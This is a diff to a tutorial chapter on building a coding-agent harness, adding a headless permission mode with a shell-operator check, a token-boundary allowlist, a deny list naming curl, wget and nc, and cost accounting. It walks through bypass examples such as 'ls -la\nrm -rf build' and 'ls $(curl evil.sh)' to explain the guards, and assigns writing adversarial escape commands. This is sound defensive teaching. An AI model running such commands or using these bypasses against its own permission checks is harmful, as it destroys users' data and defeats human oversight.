@@ -154,6 +154,7 @@ class Session:
     approved: set[str] = field(default_factory=set)     # always-allow rules
     spend_usd: float = 0.0
     budget_usd: float = 5.0
+    headless: bool = False                              # no human to prompt
 
 
 def tool_bash(args: dict, s: Session) -> str:
@@ -248,6 +249,24 @@ DENY_SUBSTRINGS = (
     "git push", "curl", "wget", "nc ", "chmod 777",
 )
 
+SHELL_OPERATORS = ("&&", "||", ";", "|", "&", ">", "<", "`", "$(", "\n", "\r")
+
+# Extra commands the automation mode may run without a human: enough to build
+# and test, nothing that reaches the network or rewrites history.
+AUTOMATION_PREFIXES = READ_ONLY_PREFIXES + (
+    "pytest", "python -m pytest", "python", "python3", "npm test", "npm run",
+    "make", "git add", "git commit",
+)
+
+
+def has_operator(cmd: str) -> bool:
+    return any(op in cmd for op in SHELL_OPERATORS)
+
+
+def matches_prefix(cmd: str, prefixes: tuple[str, ...]) -> bool:
+    """Prefix match on a token boundary, so `ls` does not admit `lsof`."""
+    return any(cmd == p or cmd.startswith(p + " ") for p in prefixes)
+
 
 def needs_approval(name: str, args: dict, s: Session) -> bool:
     if name == "read_file":
@@ -259,37 +278,72 @@ def needs_approval(name: str, args: dict, s: Session) -> bool:
         if cmd in s.approved:
             return False
         # Auto-allow single read-only commands with no shell chaining.
-        if not any(op in cmd for op in ("&&", "||", ";", "|", ">", "`", "$(")):
-            if cmd.startswith(READ_ONLY_PREFIXES):
-                return False
+        if not has_operator(cmd) and matches_prefix(cmd, READ_ONLY_PREFIXES):
+            return False
         return True
     return f"{name}:{args.get('path', '')}" not in s.approved
 
 
-def ask_permission(name: str, args: dict, s: Session) -> bool:
+def automation_decision(name: str, args: dict) -> tuple[bool, str]:
+    """Decide without a human. Returns (allowed, reason-when-denied)."""
+    if name != "bash":
+        return True, ""     # confined to ROOT, and read-before-write still applies
+    cmd = args["command"].strip()
+    if has_operator(cmd):
+        return False, ("shell operators are not allowed in headless mode; "
+                       "issue one command per bash call.")
+    if not matches_prefix(cmd, AUTOMATION_PREFIXES):
+        return False, (f"{cmd.split(' ')[0]!r} is not on the headless allowlist; "
+                       "use the project's test or build commands, or re-run "
+                       "the agent interactively.")
+    return True, ""
+
+
+def ask_permission(name: str, args: dict, s: Session) -> tuple[bool, str]:
+    """Returns (allowed, reason-when-denied). Never blocks without a terminal."""
+    key = (args["command"].strip() if name == "bash"
+           else f"{name}:{args.get('path', '')}")
+    if s.headless:
+        return automation_decision(name, args)
     print(f"\n\033[33m[permission]\033[0m {name}")
     if name == "bash":
         print(f"  $ {args['command']}")
-        key = args["command"].strip()
     else:
         print(f"  path: {args.get('path')}")
         if name == "edit_file":
             print(f"  - {args['old_string'][:200]}")
             print(f"  + {args['new_string'][:200]}")
-        key = f"{name}:{args.get('path', '')}"
-    choice = input("  [y]es / [a]lways / [n]o + reason: ").strip().lower()
-    if choice.startswith("a"):
-        s.approved.add(key)
-        return True
-    return choice.startswith("y")
+    try:
+        choice = input("  [y]es / [a]lways / [n]o + reason: ").strip().lower()
+        if choice.startswith("a"):
+            s.approved.add(key)
+            return True, ""
+        if choice.startswith("y"):
+            return True, ""
+        return False, input("  reason (optional): ").strip()
+    except EOFError:
+        return False, "no terminal is attached to approve this action."
 ```
 
-This is Chapter 2's trust gradient in miniature: a deny list that cannot be overridden, an auto-allow tier for unambiguous read-only commands, an always-allow tier that learns rules within the session, and an interactive fallback.
+This is Chapter 2's trust gradient in miniature: a deny list that cannot be overridden, an auto-allow tier for unambiguous read-only commands, an always-allow tier that learns rules within the session, an interactive fallback, and a non-interactive allowlist for when no human is present.
 
 The chaining check matters more than it looks.
 `ls` is safe; `ls && rm -rf build` starts with `ls` and is not.
 Prefix matching on a string that may contain shell operators is exactly how permission systems get bypassed, so the auto-allow tier refuses anything containing an operator.
+Enumerate that operator set carefully, because the obvious list is incomplete: a bare newline chains commands just as well as `;`, so `ls -la\nrm -rf build` sails through a guard that checks only for `&&`, `||`, `;`, `|`, and `>`.
+`&` backgrounds, `<` redirects input, and `.strip()` removes only the leading and trailing whitespace, not an embedded line break, which is why `SHELL_OPERATORS` names all of them in one place that both callers share.
+
+The second half of the guard is the prefix test itself.
+`cmd.startswith("ls")` is true of `lsof`, `lsblk`, and any binary whose name happens to begin with those two letters, so the match has to land on a token boundary: either the whole command or the prefix followed by a space.
+Two lines of code, and without them the allowlist admits programs nobody put on it.
+
 Note honestly what this still does not cover: `ls $(curl evil.sh)` is caught by the operator check, but a determined attacker with control of the model's input has a large search space, which is why the deny list, the path confinement, and - in real deployments - a container, all exist as layers rather than alternatives.
+
+The headless branch exists because an interactive prompt is not a policy when nobody is at the terminal.
+Calling `input()` from a process whose stdin is a closed pipe either blocks until the caller's timeout kills it or raises `EOFError` from inside the tool loop, and both outcomes look like an agent that mysteriously cannot finish.
+So `ask_permission` consults `automation_decision` first: file writes are allowed because `resolve` confines them to `ROOT` and the read-before-edit invariant still holds, while bash is held to the same operator check plus an explicit allowlist wide enough to run the project's tests.
+Anything outside it comes back as a readable denial the model can act on, which means the run always terminates with a result rather than hanging.
+The `EOFError` guard on the interactive path is the same lesson applied to the case where a terminal disappears mid-session.
 
 ## 5. The agent loop, transcripts, and compaction
 
@@ -310,15 +364,22 @@ are about to do, no markdown headers. State results and next actions plainly.
 
 # Approximate list prices (USD per million tokens) for the default model.
 # Re-check against current pricing; this exists to make spend visible, not exact.
+# Cache writes bill above the base input rate, cache reads far below it.
 PRICE_IN, PRICE_OUT = 5.0, 25.0
+PRICE_CACHE_WRITE, PRICE_CACHE_READ = 6.25, 0.5
 
 client = anthropic.Anthropic()
 
 
 def record_cost(usage, s: Session) -> None:
+    def tokens(name: str) -> int:
+        return getattr(usage, name, 0) or 0
+
     s.spend_usd += (
-        (usage.input_tokens + getattr(usage, "cache_creation_input_tokens", 0) or 0) * PRICE_IN
-        + usage.output_tokens * PRICE_OUT
+        tokens("input_tokens") * PRICE_IN
+        + tokens("cache_creation_input_tokens") * PRICE_CACHE_WRITE
+        + tokens("cache_read_input_tokens") * PRICE_CACHE_READ
+        + tokens("output_tokens") * PRICE_OUT
     ) / 1_000_000
 
 
@@ -385,11 +446,10 @@ def run_turn(messages: list, s: Session, max_steps: int = 60) -> list:
             if block.type != "tool_use":
                 continue
             try:
-                if needs_approval(block.name, block.input, s) and not ask_permission(
-                    block.name, block.input, s
-                ):
-                    reason = input("  reason (optional): ").strip()
-                    raise ToolError(f"user denied this action. {reason}".strip())
+                if needs_approval(block.name, block.input, s):
+                    allowed, reason = ask_permission(block.name, block.input, s)
+                    if not allowed:
+                        raise ToolError(f"action denied. {reason}".strip())
                 print(f"\033[90m  -> {block.name} {json.dumps(block.input)[:120]}\033[0m")
                 out = HANDLERS[block.name](block.input, s)
                 results.append({"type": "tool_result", "tool_use_id": block.id,
@@ -428,11 +488,11 @@ The summary prompt explicitly pins the original task and acceptance criteria, be
 # agent.py  (part 5 of 6)
 
 def main() -> None:
-    s = Session()
-    if len(sys.argv) > 1 and sys.argv[1] == "-p":
-        # Headless: one task, no interaction. Auto-deny anything needing approval.
+    headless = len(sys.argv) > 1 and sys.argv[1] == "-p"
+    s = Session(headless=headless)
+    if headless:
+        # One task, no interaction: approval comes from automation_decision.
         task = " ".join(sys.argv[2:])
-        s.approved.add("__headless__")
         run_turn([{"role": "user", "content": task}], s)
         print(f"\n[spend ${s.spend_usd:.3f}]")
         return
@@ -486,10 +546,12 @@ Run the agent inside a container with the repository mounted, a non-root user, a
 Then `--dangerously-skip-permissions`-style autonomy becomes defensible, because the blast radius is the container.
 Every guard in section 3 is defense in depth *behind* this, not a substitute for it.
 
-**Replace the deny list with an allowlist.**
+**Finish the allowlist.**
 Deny lists lose to creativity.
-For automated use, invert: parse the command, take the first token, and require it to be in an explicit allowlist (`pytest`, `python`, `npm`, `git` with an allowed subcommand set), rejecting shell operators outright and passing arguments through a validator.
-This is much more restrictive and much more defensible, and it is why real harnesses combine a permissive interactive mode with a strict automation mode.
+The headless path inverts it already, rejecting shell operators outright and requiring a token-boundary match against `AUTOMATION_PREFIXES`, which is why the same harness can offer a permissive interactive mode and a strict automation mode.
+What is still missing is argument validation: `pytest` is on the list, and `pytest --rootdir=/` is on the list too.
+Parse the command, bind each allowed program to a schema for its flags and paths, and reject anything that resolves outside `ROOT`.
+Then consider holding the interactive mode to the same allowlist, treating the prompt as a way to widen it for one command rather than as the only thing standing between the model and the shell.
 
 **Handle API failure properly.**
 Wrap `messages.create` with typed exception handling - `anthropic.RateLimitError` and `anthropic.InternalServerError` warrant backoff and retry, `anthropic.BadRequestError` usually means your message construction is wrong and retrying will not help - and stream for long outputs so you do not hit request timeouts.
@@ -586,6 +648,10 @@ Four properties make this a real eval rather than a vibe check, and all four com
 - **Fresh copy per run.** Copying to a temp directory means runs cannot contaminate each other and a destructive agent cannot damage the fixture.
 - **Tamper detection.** `protected_files` catches the agent that "fixes" the bug by editing the test - Chapter 1's reward hacking, made concrete.
 
+One coupling to keep in mind: the harness runs the agent with `-p`, so every command the agent needs in order to verify its own work has to be on `AUTOMATION_PREFIXES`.
+If a fixture's `test_cmd` is `npm run test:unit` and the allowlist stops at `pytest`, the agent will be denied its verification step and the task will score FAILED for a policy reason rather than a capability one.
+Widen `AUTOMATION_PREFIXES` to cover every fixture's test command, and copy `.agent_transcript.json` out of the temp directory before the run tears it down, because the denial text lands in a tool result and a scoreboard that cannot distinguish a policy denial from a real failure is measuring your allowlist rather than your agent.
+
 What to do with the numbers.
 Run each task at least three times, because agent runs are stochastic and a single pass tells you almost nothing; report resolved-fraction with the variance, plus median wall-clock and cost.
 Then use the eval as a regression harness: every prompt change, tool change, or model change gets re-measured against the same fixtures.
@@ -601,7 +667,7 @@ Knowing which half of your own code you expect to throw away is the mark of some
 1. Type the agent in, run it on a real repository, and complete three tasks: a one-line bug fix, adding a test, and a two-file refactor; record how many permission prompts you answered and which ones you would auto-allow permanently.
 2. Break the loop deliberately in four ways - drop `tool_use` blocks from the appended assistant message, return only one result for two tool calls, raise instead of returning an error result, and loop on tool-block count instead of `stop_reason` - and record the exact failure each produces so you recognize them in the wild.
 3. Add a `grep` tool that wraps ripgrep with a result cap and a clear too-many-results message; measure task completion on your eval before and after, and state whether it was capability or compensation.
-4. Replace the deny list with a first-token allowlist plus an argument validator, then write ten adversarial commands attempting to escape it; report how many succeeded and fix the ones that did.
+4. Add an argument validator on top of the headless allowlist and hold the interactive mode to the same policy, then write ten adversarial commands attempting to escape it; report how many succeeded and fix the ones that did.
 5. Build five eval tasks from real bugs in your own git history: use the pre-fix commit as the fixture and the test added in the fixing commit as the hidden test; run the agent three times per task and report resolved-fraction with variance.
 6. Implement compaction two ways - the summary above, and simple truncation that keeps the first and last N messages - and measure resolved-fraction and token cost on a long task; state which lost more.
 7. Add adaptive thinking with `effort` set to `low`, `high`, and `xhigh`, and produce a table of resolved-fraction, cost, and wall-clock per level; pick the setting you would ship and defend it.
@@ -614,7 +680,8 @@ You have mastered this chapter when you can:
 - Write the agent loop from memory, including appending full assistant content, pairing every tool result, batching results in one user message, and looping on `stop_reason`.
 - Explain each safety property in the tool layer - path confinement after canonicalization, the read-before-edit staleness invariant, output clipping, recoverable tool errors - and the specific bug each prevents.
 - Justify the exactly-once edit semantics and the line-numbered read format on ACI grounds without appealing to convention.
-- Describe the permission gradient you implemented, explain why prefix matching on chained commands is unsafe, and state why the container is the real control.
+- Describe the permission gradient you implemented, explain why prefix matching on chained commands is unsafe, name the operators an incomplete guard misses, and state why the container is the real control.
+- Explain why an interactive prompt is not a policy for an unattended run, and what your harness does instead when no terminal is attached.
 - Write a compaction prompt that preserves task intent and say what breaks when it does not.
 - Build a fail-to-pass eval harness from scratch, name its four integrity properties, and explain why tamper detection is not optional.
 - Sort every component of your own harness into capability scaffolding or model compensation and defend each placement.
